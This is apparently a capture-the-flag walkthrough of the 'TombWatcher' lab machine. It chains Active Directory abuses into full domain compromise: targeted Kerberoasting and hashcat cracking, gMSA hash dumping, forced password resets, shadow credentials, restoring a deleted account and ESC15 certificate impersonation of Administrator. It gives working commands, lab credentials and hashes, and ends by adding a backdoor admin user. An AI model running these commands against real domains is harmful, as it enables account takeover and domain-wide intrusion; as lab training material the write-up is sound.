## About

`TombWatcher` is a medium-difficulty Windows machine that focuses on `Active Directory privilege escalation` through a chained abuse of domain object permissions. The attack starts with the provided credentials for the user `henry`, who possesses `WriteSPN` rights over the account alfred. This access is leveraged to carry out a `targeted Kerberoasting attack`, allowing the `alfred` user’s password to be cracked and yielding control over an account that can add itself to the `INFRASTRUCTURE` group. Being a member of this group allows you to retrieve the `gMSA password` for the `ansible_dev$` managed service account. This account has the privilege to reset the password for the user `sam`, which becomes the next pivot point. Through the `sam` user, `WriteOwner` permissions over the user `john` are abused to obtain a GenericAll ACE, enabling a password reset and full access to the john user, who is a member of the `Remote Management Users` group. This provides an interactive shell and access to the user flag. Privilege escalation to Administrator is then achieved by abusing `john` user’s `GenericAll` rights over the `ADCS` organizational unit. A previously deleted account, `cert_admin`, is restored using the `Active Directory Recycle Bin`, its password is reset, and it is leveraged to exploit `ESC15` against a misconfigured WebServer certificate template. This ultimately allows the issuance of a certificate for Administrator, resulting in full domain compromise.



## intial access

As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following:
```
account: henry / H3nry_987TGV!
```
## Nmap

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-28 14:16:19Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```
## SMB
```
smbclient -L //10.129.232.167/ -U henry
```

![](pics/Pasted%20image%2020260828133343.png)

## Getting shell

### wmi
```
impacket-wmiexec 'tombwatcher.htb/henry:H3nry_987TGV!@10.129.232.167'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[-] WMI Session Error: code: 0x80041003 - WBEM_E_ACCESS_DENIED
```

### smb
```
impacket-psexec 'tombwatcher.htb/henry:H3nry_987TGV!@10.129.232.167'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.232.167.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.

```



## AD enum

```
rusthound-ce -d tombwatcher.htb -i 10.129.232.167 -u henry -p 'H3nry_987TGV!' -z 
```
Seeing what out-bound Henry have on other users
![](pics/Pasted%20image%2020260828144516.png)
## Henry to Alfred

Using writeSPN:
```
./targetedKerberoast.py -v -d 'tombwatcher.htb' --dc-ip 10.129.232.167  -u 'henry' -p 'H3nry_987TGV!'
```
![](pics/Pasted%20image%2020260828145805.png)

Fix time sync error
```
sudo timedatectl set-ntp off
sudo rdate -n <ip>
```

![](pics/Pasted%20image%2020260828150137.png)

Got the hash
```
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$f6b3b6515157a9ba671ddb746eb452b1$6cf0e116effb937c59fe90980c19b3e1559cc03d9a3855337174f9e7ae288d3ba17bc51af2144e33f657c8a3f0bbce392c4f27eab2b52ea4b755d586592353e9e7bb6161b604da60df234a16c5a45ff9e3399aa2c23da17c2a39a3384cbf152f281667a9143e848c5ecd35bcc0c5bdb2f5da0daab555891582737ecdb3a8addece142a7063db4d5476bbc7c523eb675319ecb84b023fad3de73d5997853b0831c5897caa0a808cc0d47bec5f785acf6d5bb5d5a7eb4118a45851d81a9d53de4c720d717c1cb2649fcd66a58e3a97315841a4496d5f3270be756007d0a2ddfe5782182e9e9c9906413909fedb8f708787bd6c226af60b783f675c840a87453ef4bc42dbc15b7cbfcc7cea4bb0b9bf837208b0574d4df4088f362de6c973ec405e5794827819c80577a442d7258b336ef26aa74e174d0933cd0d61179b50d562fc37720f5849ee39a2c05e2718e98c2011a9135bf98bf146f6d5ecc19429bec851c14b5641cde29fcdc611de03bda55bee64268bc9ead288bb5f6777c6592c0e8da612a06d1ee3a131494a26467e06ce576ce9621fd9a768c46629a98bef827486d2b7401a5b7b059516e9ed22467e6d01c029fc5a86a21e0dc61b5880c4c242be352cefbb183ce0ca8ed6ae80b9376b84a05ad1a350bda83e239571536979df422090eb0b9682aa1d9d2680c960cfcec6bbe3e207184fe805847ff4d8c261d03d91553d875a0e8a4c37c452ba09698753574a2753150db62445fc8edc1534c885298ed4338e60aa0daacab10c31db6b59b6bda8dbba102dbd171ab20c2a34b4c2fb571241e2a1354c2ef221770a4f101f5e61d4952665a5916cd3665c1382ef94ca54b02ecfb941ebb3c02fae98b236b373c24fca218f1979b477372fe204cdcb02e6568453449391b9b22cf83c67767d6deb011533d3ac8132a6e90497753b638d60c1f38b01b16880ca6a73c4a0e49c0aaffd69ad24d401a4ed036b0e1d1a62bbb274013160dc1b47025766a95bf03cea2628e4da3bdedc872d88c1f5e64cafffae7b38ac14b437db23b90a5a34d796bfc94d00f31a80db94c9dfae8b73a29864b25e566c00aee4cfbe0f09237b525291ed258a060ab903c1ea420c7204a021dee928c8c473a2e2617edccbe56bf218551022951810fa19ad7d86a65cd1247753f74b963bb7ed6557f98c10c5cd272e9de3719d26b4081f357d74474791726490d7e030a503be622a777a720f1f4c9456453735b83d05a75e07eff3705343802dffa26352688e95726b6991ab38905815701a096d64e521f03de63ca5abda4113ad0b05cdd645c45371c60a0b2792976574d7ed289a9c7c5f7e17cade3e1943e1d4e9d23a388862ef503afd4ef4962f9df6a8b2bc9ccdcc33c43e38ee5ceeb109caa89f3bf69a3239c56dec62c4864c42f7f1d50d1590db18af4c64d8a9eb1fce2b6b54ae95ede489459f0df6199b5f25faf4939c
```
![](pics/Pasted%20image%2020260828150322.png)

## Crack it

Found out the type of the hash
![](pics/Pasted%20image%2020260828150714.png)

Using hashcat:
```
hashcat -a 0 -m 13100 alfred_hash /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou-50.txt
```
![](pics/Pasted%20image%2020260828150936.png)

```
user = alfred
password = basketball
```

## What can alfred do

![](pics/Pasted%20image%2020260828151410.png)
Since can be add himself to this group lets do it
## Adding alfred to infrastructure group

```
bloodyAD -d tombwatcher.htb -u alfred -p basketball -H 10.129.232.167 add groupMember infrastructure alfred
```
![649](pics/Pasted%20image%2020260828153755.png)


## From Infrastructure to ansible_dev

![](pics/Pasted%20image%2020260828144746.png)
we have `ReadGMSAPassword`

```
gMSADumper.py -u 'alfred' -p 'basketball' -d 'tombwatcher.htb'

 > Infrastructure
ansible_dev$:::cb3161cb2c9d84b58ba3014f55040d75
ansible_dev$:aes256-cts-hmac-sha1-96:b044a33a975eb2fcd58b84b7b945b28356c8473343593b98baeebb16e42829c4
ansible_dev$:aes128-cts-hmac-sha1-96:3a5c2db5ab790f12d0101daf6ee07534
```

![](pics/Pasted%20image%2020260828155117.png)

## From ansible_dev to Sam


As shown I can have the right to change the user `SAM` password
![](pics/Pasted%20image%2020260828144923.png)

Using `bloodAD`:
```
bloodyAD -d tombwatcher.htb -u 'ansible_dev$' -p ':cb3161cb2c9d84b58ba3014f55040d75' -H 10.129.232.167 set password sam 'Summer@123!'
```

![](pics/Pasted%20image%2020260828162014.png)

New creds
```
sam:Summer@123!
```



## From sam to john

![](pics/Pasted%20image%2020260828144939.png)
Since I can change owner of John
```
bloodyAD -d tombwatcher.htb -u 'sam' -p 'Summer@123!' -H 10.129.232.167 set owner john sam
```
![](pics/Pasted%20image%2020260828162853.png)

add `genericAll` to sam on john
```
bloodyAD -d tombwatcher.htb -u 'sam' -p 'Summer@123!' -H 10.129.232.167 add genericAll john sam
```
![](pics/Pasted%20image%2020260828163047.png)

### Perform shadow 

```
certipy shadow auto -u 'sam@tombwatcher.htb' -p 'Summer@123!' -account john -dc-ip 10.129.232.167
```
![](pics/Pasted%20image%2020260828164558.png)


## Flag 1

Login with john hash via evil-winRM:
```
evil-winrm -i 10.129.232.167 -u john -H 'ad9324754583e3e42b55aad4d3b8d2bf'
```

![](pics/Pasted%20image%2020260828164922.png)

## PrivEsc from john to cert_admin


Looking at `john` connections
![](pics/Pasted%20image%2020260828172150.png)
Seem Like a dead end for now.

After looking into the templates found this isolated object that is  deleted 
![](pics/Pasted%20image%2020260828172126.png)

From the shell we got lets investigate further using powershell
```
Get-ADObject -Filter {objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"} -IncludeDeletedObjects -Properties *
```
![](pics/Pasted%20image%2020260828172902.png)


```
accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
CN                              : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:07:04 PM
createTimeStamp                 : 11/16/2024 12:07:04 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:07:27 PM
modifyTimeStamp                 : 11/16/2024 12:07:27 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762504248946345
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13197
uSNCreated                      : 13186
whenChanged                     : 11/16/2024 12:07:27 PM
whenCreated                     : 11/16/2024 12:07:04 PM
```

Restore it
```
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
```
![](pics/Pasted%20image%2020260828173230.png)

Now lets remove `-IncludeDeletedObjects`:
![](pics/Pasted%20image%2020260828201345.png)

As we see `cert_admin` belong to the `ADCS` group which `john` have `GenericAll` to.

## From john to cert_admin

Using the same command we used to move from sam to john
```bash
certipy shadow auto -dc-ip 10.129.232.167 -u john@tombwatcher.htb -hashes ':ad9324754583e3e42b55aad4d3b8d2bf' -account cert_admin
```
![](pics/Pasted%20image%2020260828201846.png)

New hash
```
cert_admin:f87ebf0febd9c4095c68a88928755773
```

## From cert_admin to root

Now lets see how we can exploit the `cert_admin` enrollement in `WEBSERVER` template
```
certipy find -dc-ip 10.129.232.167 -u cert_admin@tombwatcher.htb -hashes ':f87ebf0febd9c4095c68a88928755773'
```
findings
```
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
      ESC17                             : Enrollee supplies subject and template allows server authentication.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
      ESC17                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

### Exploit ESC15 vulnerability

```
certipy req -ca tombwatcher-CA-1 -u 'cert_admin@tombwatcher.htb' -hashes ':f87ebf0febd9c4095c68a88928755773' -template WebServer -upn 'Administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' -application-policies 'Client Authentication'
```
![](pics/Pasted%20image%2020260828210514.png)

## Flag 2

Using `certipy` again:
```
certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.232.167' -ldap-shell
```
![](pics/Pasted%20image%2020260828210742.png)

Creating a temp user and add it to the `Administrators` group
```

Adding new user with username: temp_user and password: 5!nw7NT5JKGfcSV result: OK

# add_user_to_group temp_user Administrators
Adding user: temp_user to group Administrators result: OK

```

Use evil-winRM to login to the new account
```
evil-winrm -i 10.129.232.167 -u temp_user -p '5!nw7NT5JKGfcSV'
```
![](pics/Pasted%20image%2020260828211447.png)

The Flag !!
![](pics/Pasted%20image%2020260828211503.png)


![](pics/Pasted%20image%2020260828211544.png)

